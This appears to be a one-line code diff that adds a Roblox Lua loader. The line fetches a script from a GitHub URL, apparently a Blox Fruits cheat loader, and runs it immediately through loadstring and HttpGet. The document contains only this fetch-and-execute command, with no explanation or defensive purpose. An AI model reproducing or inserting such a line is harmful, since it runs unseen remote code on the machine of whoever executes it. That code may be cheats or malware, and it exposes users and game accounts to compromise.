@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/blox-fruits-spam5-8wjl3z55oci4zq.lua"))()
